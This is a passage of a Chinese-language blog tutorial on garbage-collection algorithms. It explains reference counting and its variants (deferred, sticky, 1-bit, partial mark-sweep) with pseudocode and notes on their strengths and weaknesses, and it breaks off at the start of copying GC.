class="code"><pre><span class="line"><span class="comment">// update_ptr：两步操作，一是进行计数器的增减，二是更新指针指向的对象。这里需要注意的就是需要先加后减，原因是为了处理 *ptr 和 obj 是同一对象时的情况，当先减后加时，obj的引用计数可能变为0被释放了，此时再进行加就找不到对象了（因为已经被回收了）。</span></span><br><span class="line"><span class="built_in">update_ptr</span>(ptr, obj)&#123;</span><br><span class="line"> <span class="built_in">inc_ref_cnt</span>(obj)</span><br><span class="line"> <span class="built_in">dec_ref_cnt</span>(*ptr)</span><br><span class="line"> *ptr = obj</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// inc_ref_cnt：简单将计数器数值加一。</span></span><br><span class="line"><span class="built_in">inc_ref_cnt</span>(obj)&#123;</span><br><span class="line"> obj.ref_cnt++</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// dec_ref_cnt：首先将计数器数值减一，如果该对象计数器数值变为0，则递归调用dec_ref_cnt函数处理该对象的子对象。之后释放该对象。</span></span><br><span class="line"><span class="built_in">dec_ref_cnt</span>(obj)&#123;</span><br><span class="line"> obj.ref_cnt--</span><br><span class="line"> <span class="keyword">if</span>(obj.ref_cnt == <span class="number">0</span>)</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(obj))</span><br><span class="line"> <span class="built_in">dec_ref_cnt</span>(*child)</span><br><span class="line"> <span class="built_in">reclaim</span>(obj)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引用计数法有两个特点</p><ol><li>引用计数法的垃圾回收是实时的。</li><li>可以说将内存管理和mutator同时运行。</li></ol><h4 id="评估-1"><a href="#评估-1" class="headerlink" title="评估"></a>评估</h4><h5 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h5><ol><li><code>立即回收垃圾</code>：垃圾可以实时的被回收掉，并将chunk链接到空闲链表中供对象申请</li><li><code>最大暂停时间短</code>：其他GC方式都有一个专门的GC阶段，而引用计数法的GC和mutator是同时运行的。</li><li><code>没必要沿指针查找</code>：这个是引用计数法的特点，不同于搜索型算法，引用计数法没有遍历内存的过程。</li></ol><h5 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h5><ol><li><code>计数器值的增减处理繁重</code>：大多数情况下指针会频繁地更新。特别是有根的指针，这是因为根可以通过 mutator 直接被引用。</li><li><code>计数器需要占用很多位</code>：用于引用计数的计数器最大必须能数完堆中所有对象的引用数。假如我们用的是 32 位机器，那么就有可能要让 2 的 32 次方个对象同时引用一个对象。使堆使用效率降低了。</li><li><code>实现烦琐复杂</code>：引用计数的算法本身很简单，但事实上需要在每一处修改指针的代码出都加上增减计数器的逻辑。因为修改指针会发生的非常频繁，所以重写过程中很容易出现遗漏。引发bug或安全漏洞。</li><li><code>循环引用无法回收</code>：当两个对象互相引用时，各对象的计数器的值均为1。但是这些对象组并没有被其他任何对象引用。因此想一并回收这两个对象都不行。</li></ol><p>虽然引用计数法有很多缺点，但是引用计数法只要稍加改良，就会变得非常具有实用性了。</p><h4 id="优化措施-1"><a href="#优化措施-1" class="headerlink" title="优化措施"></a>优化措施</h4><h5 id="延迟引用计数法（Deferred-Reference-Counting）"><a href="#延迟引用计数法（Deferred-Reference-Counting）" class="headerlink" title="延迟引用计数法（Deferred Reference Counting）"></a>延迟引用计数法（Deferred Reference Counting）</h5><p>该方式解决的是<code>计数器值的增减处理繁重</code>的问题。根的引用变化频繁是导致计数器增减处理繁重的重要原因之一。因此可以让根引用的指针变化不反映在计数器上。但可能发生对象仍在活动，但却被错当成垃圾回收的情况。于是，我们可以在延迟引用计数法中使用 ZCT（Zero Count Table）。ZCT 是一个表，它会记录计数器值在 dec_ref_cnt函数的作用下变为 0 的对象。由于计数器值为 0 的对象不一定都是垃圾，所以暂时先将这些对象保留。当ZST表爆满之后对ZST表进行处理来回收真正的垃圾。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918120635560.png" alt="image-20210918120635560"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dec_ref_cnt：减计数器函数。当对象的计数器被减为0时将其放入ZST表中，如果ZST表爆满则调用scan_zct清理ZST表，让活动对象离开，回收垃圾。</span></span><br><span class="line"><span class="built_in">dec_ref_cnt</span>(obj)&#123;</span><br><span class="line"> obj.ref_cnt--</span><br><span class="line"> <span class="keyword">if</span>(obj.ref_cnt == <span class="number">0</span>)</span><br><span class="line"> <span class="keyword">if</span>(<span class="built_in">is_full</span>($zct) == TRUE)</span><br><span class="line"> <span class="built_in">scan_zct</span>()</span><br><span class="line"> <span class="built_in">push</span>($zct, obj)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// new_obj：分配对象的chunk。会进行两次chunk的分配，第一次试图常规分配。如果不成功则清空ZST进行第二次chunk分配。</span></span><br><span class="line"><span class="built_in">new_obj</span>(size)&#123;</span><br><span class="line"> obj = <span class="built_in">pickup_chunk</span>(size, $free_list)<span class="comment">// 第一次chunk分配</span></span><br><span class="line"> <span class="keyword">if</span>(obj == <span class="literal">NULL</span>)</span><br><span class="line"> <span class="built_in">scan_zct</span>()</span><br><span class="line"> obj = <span class="built_in">pickup_chunk</span>(size, $free_list)<span class="comment">// 清空ZST后进行第二次chunk分配</span></span><br><span class="line"> <span class="keyword">if</span>(obj == <span class="literal">NULL</span>)</span><br><span class="line"> <span class="built_in">allocation_fail</span>()</span><br><span class="line"> obj.ref_cnt = <span class="number">1</span></span><br><span class="line"> <span class="keyword">return</span> obj</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// scan_zct：清空ZST表。首先将根引用的对象加一（为了使计数器正常体现对象的引用计数）。此时判断ZST表的所有对象的引用计数，如果对象计数器为0则将其释放并移出ZST。如果大于0则代表该对象为活动对象，只将其移出ZST。</span></span><br><span class="line"><span class="built_in">scan_zct</span>()&#123;</span><br><span class="line"> <span class="keyword">for</span>(r : $roots)</span><br><span class="line"> (*r).ref_cnt++</span><br><span class="line"> <span class="keyword">for</span>(obj : $zct)</span><br><span class="line">     <span class="built_in">remove</span>($zct, obj)<span class="comment">// 不管obj.ref_cnt是否为0都将其移出ZST。</span></span><br><span class="line"> <span class="keyword">if</span>(obj.ref_cnt == <span class="number">0</span>)</span><br><span class="line"> <span class="built_in"><span class="keyword">delete</span></span>(obj)</span><br><span class="line"> <span class="keyword">for</span>(r : $roots)</span><br><span class="line"> (*r).ref_cnt--</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// delete：递归处理该对象的子对象的引用计数，并将该对象挂在空闲队列上。</span></span><br><span class="line"><span class="built_in"><span class="keyword">delete</span></span>(obj)&#123;</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(obj)</span><br><span class="line"> (*child).ref_cnt--</span><br><span class="line"> <span class="keyword">if</span>((*child).ref_cnt == <span class="number">0</span>)</span><br><span class="line"> <span class="built_in"><span class="keyword">delete</span></span>(*child)</span><br><span class="line"> <span class="built_in">reclaim</span>(obj)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>【优点】延迟了根引用的计数，减轻了因根引用对计数器增减造成的负担。</p><p>【缺点】为了延迟计数器值的增减，势必造成垃圾不能马上得到回收。导致最大暂停时间延长。</p><h5 id="Sticky引用计数法"><a href="#Sticky引用计数法" class="headerlink" title="Sticky引用计数法"></a>Sticky引用计数法</h5><p>该方式解决的是<code>计数器需要占用很多位</code>的问题。核心在于减少计数器的位宽。但减少位宽可能会出现数值溢出的现象。针对计数器溢出的问题，主要有两种方法来处理这个问题。</p><ol><li><p><code>do nothing</code>：不再处理该计数器溢出的对象。某对象计数器溢出正说明该对象较为重要，不易变为垃圾而被回收。</p></li><li><p><code>使用GC标记-清除算法进行管理</code>：可以使用GC 标记 - 清除算法来充当引用计数法的后援。大致思路就是将计时器全部清零（目的是为了模拟GC 标记 - 清除算法中的标记位），之后还是像GC 标记 - 清除算法一样，将活动对象的计数器+1，也就是让他非0，之后遍历整个堆回收非活动对象。</p><p>这里的的 GC 标记 - 清除算法和之前的 GC 标记 - 清除算法主要有以下 3 点不同。</p><blockquote><ol><li> 一开始就把所有对象的计数器值设为 0</li><li> 不标记对象，而是对计数器进行增量操作</li><li> 为了对计数器进行增量操作，算法对活动对象进行了不止一次的搜索</li></ol></blockquote><p>【优点】即使对象在计数器溢出后成了垃圾，程序还是能回收它。</p><p>【优点】可以回收循环的垃圾。</p><p>【缺点】吞吐量会降低：一是因为需要重置所有对象的计数器。二是由于这里的的 GC 标记 - 清除算法是进行计数器的增量，此时对象的索引也需要消耗一定的时间。</p></li></ol><h5 id="1位引用计数法（1bit-Reference-Counting）"><a href="#1位引用计数法（1bit-Reference-Counting）" class="headerlink" title="1位引用计数法（1bit Reference Counting）"></a><strong>1</strong>位引用计数法（1bit Reference Counting）</h5><p>1 位引用计数法解决的仍然是<code>计数器需要占用很多位</code>的问题。基于“一般的对象都很难被共有”的理论，可以得出一般的对象引用计数都为1。考虑到这一点，我们用 1 位来表示某个对象的被引用数是 1 个还是多个（即用 0 表示被引用数为 1， 1 表示被引用数&gt;= 2，我们分别称以上 2 种状态为 UNIQUE 和 MULTIPLE），这样也能达到目的。</p><p>1 位引用计数法比较特殊的一点在于它使用指针来存放引用计数（正常引用计数法使用对象来存放，这里凭借四字节对齐最后两位不能利用的性质，可以将这个引用计数，也可以叫做flag放入指针来达到目的），这样当更新指针时只要将指针复制即可。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210928162537983.png" alt="image-20210928162537983"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210928162619036.png" alt="image-20210928162619036"></p><p>这里更新了之前由 A 引用 D 的指针，让其引用 C。这也可以看成是把由 B 到 C 的指针复制到 A 了。通过这项操作，两个指向 C 的指针都变成了 MULTIPLE 指针。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 上图的 A 的指针就是dest_ptr，B 的指针就是被复制的src_ptr。经过复制，两个指针都会set_multiple_tag，也就是都变成了 MULTIPLE 指针。</span></span><br><span class="line"><span class="built_in">copy_ptr</span>(dest_ptr, src_ptr)&#123;</span><br><span class="line"> <span class="built_in">delete_ptr</span>(dest_ptr)</span><br><span class="line"> *dest_ptr = *src_ptr</span><br><span class="line"> <span class="built_in">set_multiple_tag</span>(dest_ptr)</span><br><span class="line"> <span class="keyword">if</span>(<span class="built_in">tag</span>(src_ptr) == UNIQUE)</span><br><span class="line"> <span class="built_in">set_multiple_tag</span>(src_ptr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个函数超级简单。只有当指针 ptr 的标签是 UNIQUE 时，它才会回收根据这个指针所引用的对象。因为当标签是 MULTIPLE 时，还可能存在其他引用这个对象的指针，所以它无法回收对象。</span></span><br><span class="line"><span class="built_in">delete_ptr</span>(ptr)&#123;</span><br><span class="line"> <span class="keyword">if</span>(<span class="built_in">tag</span>(ptr) == UNIQUE)</span><br><span class="line"> <span class="built_in">reclaim</span>(*ptr)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>【优点】<code>不容易出现高速缓存缺失</code>：缓存作为一块存储空间，比内存的读取速度要快得多。如果要读取的数据就在缓存里的话，计算机就能进行高速处理；但如果需要的数据不在缓存里（即高速缓存缺失）的话，就需要读取内存，比较浪费时间。当某个对象 A 要引用在内存中离它很远的对象 B 时，以往的引用计数法会在增减计数器值的时候读取 B，从而导致高速缓存缺失。但由于1 位引用计数法不需要在更新计数器（或者说是标签）的时候读取要引用的对象，只是指针的复制过程，所以可以减少出现这种问题。</p><p>【优点】<code>节省内存</code>：毕竟只占用1位。</p><p>【缺点】<code>无法处理计数器溢出的对象</code>：和 Sticky 引用计数法一样，这个可能需要其他方式（比如GC标记-清除算法）辅助操作。</p><h5 id="部分标记-清除算法（Partial-Mark-amp-Sweep）"><a href="#部分标记-清除算法（Partial-Mark-amp-Sweep）" class="headerlink" title="部分标记-清除算法（Partial Mark &amp; Sweep）"></a>部分标记-清除算法（Partial Mark &amp; Sweep）</h5><p>首先提一句，这个算法看起来比较麻烦，但是原理还是很容易懂的，无非就是利用了一个队列存放可疑对象之后对可疑对象进行操作的过程。</p><p>上面用来兜底的GC 标记 - 清除算法由于以全部堆为对象导致效率很低。产生了很多无用的搜索。因此我们可以只对“可能有循环引用的对象群”使用 GC 标记 - 清除算法，对其他对象进行内存管理时使用引用计数法。像这样只对一部分对象群使用 GC 标记 -清除算法的方法，叫作“部分标记 - 清除算法”。</p><p><strong>说白了，这个算法的目的就是为了找到循环引用的对象群并进行处理。</strong></p><p>在部分标记 - 清除算法中，对象会被涂成 4 种不同的颜色来进行管理。每个颜色的含义如下：</p><blockquote><ol><li> 黑（BLACK）：绝对不是垃圾的对象（对象产生时的初始颜色）</li><li> 白（WHITE）：绝对是垃圾的对象</li><li> 灰（GRAY）：搜索完毕的对象</li><li> 阴影（HATCH）：可能是循环垃圾的对象。</li></ol></blockquote><p>具体实施方式是往头中分配 2 位空间，然后用00～11 的值对应这 4 个颜色，以示区分。这里用 obj.color 来表示对象 obj 的颜色。obj.color 取 BLACK、WHITE、GRAY、HATCH 中的任意一个值。</p><p>下面是具体步骤，以一个具体的例子进行描述</p><h6 id="1、初始状态"><a href="#1、初始状态" class="headerlink" title="1、初始状态"></a>1、初始状态</h6><p>有循环引用的对象群是 ABC 和 DE，其中 A 和 D 由根引用。此外，这里由 C 和 E 引用 F。所有对象的颜色都还是初始状态下的黑色。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918135504458.png" alt="image-20210918135504458"></p><h6 id="2、dec-ref-cnt"><a href="#2、dec-ref-cnt" class="headerlink" title="2、dec_ref_cnt"></a>2、dec_ref_cnt</h6><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dec_ref_cnt：在进行减引用的操作时，如果该对象的引用计数不为0，将其颜色涂成阴影，并放入一个专门存放阴影对象的队列中。</span></span><br><span class="line"><span class="built_in">dec_ref_cnt</span>(obj)&#123;</span><br><span class="line"> obj.ref_cnt--</span><br><span class="line"> <span class="keyword">if</span>(obj.ref_cnt == <span class="number">0</span>)</span><br><span class="line"> <span class="built_in"><span class="keyword">delete</span></span>(obj)</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span>(obj.color != HATCH)</span><br><span class="line"> obj.color = HATCH</span><br><span class="line"> <span class="built_in">enqueue</span>(obj, $hatch_queue)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这步操作后堆状态如下。由根到 A 的引用被删除了，指向 A 的指针被追加到了队列（$hatch_queue）之中。此外，A 被涂上了阴影。这个队列的存在是为了连接那些可能是循环引用的一部分的对象。被连接到队列的对象会被作为 GC 标记 - 清除算法的对象，使得循环引用的垃圾被回收。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918140036603.png" alt="image-20210918140036603"></p><h6 id="3、new-obj-amp-scan-hatch-queue"><a href="#3、new-obj-amp-scan-hatch-queue" class="headerlink" title="3、new_obj &amp; scan_hatch_queue"></a>3、new_obj &amp; scan_hatch_queue</h6><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// new_obj：当可以分配时，对象就会被初始化成黑色。当分配无法顺利进行的时候，程序会通过 scan_hatch_queue() 函数搜索阴影队列去尝试回收垃圾。scan_hatch_queue() 函数执行完毕后，程序会递归地调用 new_obj() 函数再次尝试分配。</span></span><br><span class="line"><span class="built_in">new_obj</span>(size)&#123;</span><br><span class="line"> obj = <span class="built_in">pickup_chunk</span>(size)</span><br><span class="line"> <span class="keyword">if</span>(obj != <span class="literal">NULL</span>)</span><br><span class="line"> obj.color = BLACK</span><br><span class="line"> obj.ref_cnt = <span class="number">1</span></span><br><span class="line"> <span class="keyword">return</span> obj</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">is_empty</span>($hatch_queue) == FALSE)</span><br><span class="line"> <span class="built_in">scan_hatch_queue</span>()</span><br><span class="line"> <span class="keyword">return</span> <span class="built_in">new_obj</span>(size)</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> <span class="built_in">allocation_fail</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// scan_hatch_queue：如果取出的对象 obj 被涂上了阴影，程序就会将 obj 作为参数，依次调用 paint_gray、scan_gray和 collect_white 函数从而通过这些函数找出循环引用的垃圾，将其回收。当 obj 没有被涂上阴影时，就意味着 obj 没有可能形成循环引用。此时程序将再次调用 scan_hatch_queue函数进行下一个阴影对象的操作。</span></span><br><span class="line"><span class="built_in">scan_hatch_queue</span>()&#123;</span><br><span class="line"> obj = <span class="built_in">dequeue</span>($hatch_queue)</span><br><span class="line"> <span class="keyword">if</span>(obj.color == HATCH)</span><br><span class="line"> <span class="built_in">paint_gray</span>(obj)</span><br><span class="line"> <span class="built_in">scan_gray</span>(obj)</span><br><span class="line"> <span class="built_in">collect_white</span>(obj)</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">is_empty</span>($hatch_queue) == FALSE)</span><br><span class="line"> <span class="built_in">scan_hatch_queue</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="4、paint-gray"><a href="#4、paint-gray" class="headerlink" title="4、paint_gray"></a>4、paint_gray</h6><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// paint_gray：将选中的阴影对象及子对象（子对象颜色需为黑或阴影）涂灰，并将所有对象的子对象的引用计数减一，</span></span><br><span class="line"><span class="built_in">paint_gray</span>(obj)&#123;</span><br><span class="line"> <span class="keyword">if</span>(obj.color == (BLACK | HATCH))</span><br><span class="line"> obj.color = GRAY</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(obj))</span><br><span class="line"> (*child).ref_cnt--</span><br><span class="line"> <span class="built_in">paint_gray</span>(*child)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行完成后大概如下图</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918142421368.png" alt="image-20210918142421368"></p><p>执行过程如下图</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918142502685.png" alt="image-20210918142502685"></p><p>首先，在 (a) 中 A 被涂成了灰色。虽然程序对计数器执行了减量操作，但并不是对 A，而是对 B 的计数器进行了减量操作。下面在 (b) 中 B 也被涂成了灰色，不过这时程序并没有对 B 进行减量操作，而是对 C 进行了减量操作。在 (c) 中 C 被涂成灰色时，程序对 A 和 F 的计数器进行了减量操作。这样一来，A、B、C 的循环垃圾的计数器值都变成了 0。(d) 是 A、B、C、F 各个对象搜索结束后的样子。</p><p>部分标记 - 清除算法的特征就是要涂色的对象和要进行计数器减量的对象不是同一对象，据此就可以很顺利地回收循环垃圾。这样做的原因是为了明确这个阴影对象是否在环内，证明如下：</p><p>假如原始图如下</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918142915296.png" alt="image-20210918142915296"></p><p>当要涂色的对象和要进行计数器减一的对象为同一对象时，过程如下</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918143007263.png" alt="image-20210918143007263"></p><p>这样我们并不能通过A的引用计数直接确定该对象是否在环中。因为无论A是否成环，它的引用计数一直为0，所以无法对是否成环进行区分。而当我们计数器减一的对象在涂色对象之后时，我们可以很容易通过A的计数判断它是否是一个独立的环。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918143229160.png" alt="image-20210918143229160"></p><p>当搜索完 C 时对象 A 的计数器值为 1，所以 A 不能被回收。所以很明显这个并不是一个独立的环。在这之后，paint_black() 函数会把对象 A 到 C 全部涂黑，也会对 B 和 C 的计数器进行增量操作，这样对象就完全回到了原始的状态。</p><h6 id="5、scan-gray"><a href="#5、scan-gray" class="headerlink" title="5、scan_gray"></a>5、scan_gray</h6><p>执行完 paint_gray() 函数以后，下一个要执行的就是 scan_gray() 函数。它会搜索灰色对象，把计数器值为 0 的对象涂成白色。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// scan_gray：这个函数作用是为了操作灰色对象，如果灰色对象的引用计数为0则将其涂白，否则将其涂黑。</span></span><br><span class="line"><span class="built_in">scan_gray</span>(obj)&#123;</span><br><span class="line"> <span class="keyword">if</span>(obj.color == GRAY)</span><br><span class="line"> <span class="keyword">if</span>(obj.ref_cnt &gt; <span class="number">0</span>)</span><br><span class="line"> <span class="built_in">paint_black</span>(obj)</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> obj.color = WHITE</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(obj))</span><br><span class="line"> <span class="built_in">scan_gray</span>(*child)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// paint_black：在涂黑的过程中也会将引用计数恢复，因为涂灰操作将引用计数减一了。</span></span><br><span class="line"><span class="built_in">paint_black</span>(obj)&#123;</span><br><span class="line"> obj.color = BLACK</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(obj))</span><br><span class="line"> (*child).ref_cnt++</span><br><span class="line"> <span class="keyword">if</span>((*child).color != BLACK)</span><br><span class="line"> <span class="built_in">paint_black</span>(*child)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时现场如下，不难看出，形成了循环垃圾的对象 A、B、C 被涂成了白色，而有循环引用的非垃圾对象 D、E、F 被涂成了黑色。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918143831904.png" alt="image-20210918143831904"></p><h6 id="6、collect-white"><a href="#6、collect-white" class="headerlink" title="6、collect_white"></a>6、collect_white</h6><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// collect_white，这个函数很简单，就是为了回收白色对象。但是这里我并不明白为什么还要把obj涂黑。</span></span><br><span class="line"><span class="built_in">collect_white</span>(obj)&#123;</span><br><span class="line"> <span class="keyword">if</span>(obj.color == WHITE)</span><br><span class="line"> obj.color = BLACK</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(obj))</span><br><span class="line"> <span class="built_in">collect_white</span>(*child)</span><br><span class="line"> <span class="built_in">reclaim</span>(obj)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回收独立环后的对象如下。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918144147141.png" alt="image-20210918144147141"></p><p>到这步已经完成了整个回收独立环的操作，大体步骤就是先将可疑对象挑出，然后遍历可疑对象挨个判断，判断方式为将子对象的引用计数减一，如果成环则环内的引用计数都会互相减为0，最终自身也会被减为0，也就是对象自己发起操作后又反馈改变了自身，这样就判断了环是否存在，之后就是回收环内对象的过程。而这个阴影队列的作用就在于假如这个阴影对象真的在环中我们无法找到他，就可以通过队列存放的指针指向这块空间。</p><p>【优点】<code>吞吐量</code>：聚焦于成环对象的搜索与清除，减少了其他无需索引对象的索引成本。</p><p>【缺点】<code>吞吐量</code>：还是吞吐量的问题，对队列中的候选垃圾处理较复杂。由于该算法对队列中每个对象进行了三次操作（mark_gray，scan_gray和collect_white），增加了内存管理所花费的时间。</p><p>【缺点】<code>最大暂停时间增加</code>：势必增加最大暂停时间的长度，毕竟会对队列对象进行操作。</p><h3 id="GC复制算法（Copying-GC）"><a href="#GC复制算法（Copying-GC）" class="headerlink" title="GC复制算法（Copying GC）"></a>GC复制算法（Copying GC）</h3><h4 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h4><p>GC复制算法需要两块同样大小的空间，分别称为From空间和To空间。通过将From 空间的活动对象复制到To空间，再对From 空间和 To 空间互换来实现GC，此时新的From空间是一块干净的空间。（Marvin L. Minsky 1963发布）</p><h4 id="实现-2"><a href="#实现-2" class="headerlink" title="实现"></a>实现</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// copying：将活动的对象从From空间copy进To空间，再对From 空间和 To 空间互换</span></span><br><span class="line"><span class="built_in">copying</span>()&#123;</span><br><span class="line"> $free = $to_start</span><br><span class="line"> <span class="keyword">for</span>(r : $roots)</span><br><span class="line"> *r = <span class="built_in">copy</span>(*r)</span><br><span class="line"> <span class="built_in">swap</span>($from_start, $to_start)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// copy：复制给定的活动对象并递归copy该对象的子对象</span></span><br><span class="line"><span class="built_in">copy</span>(obj)&#123;</span><br><span class="line"> <span class="keyword">if</span>(obj.tag != COPIED)</span><br><span class="line"> <span class="built_in">copy_data</span>($free, obj, 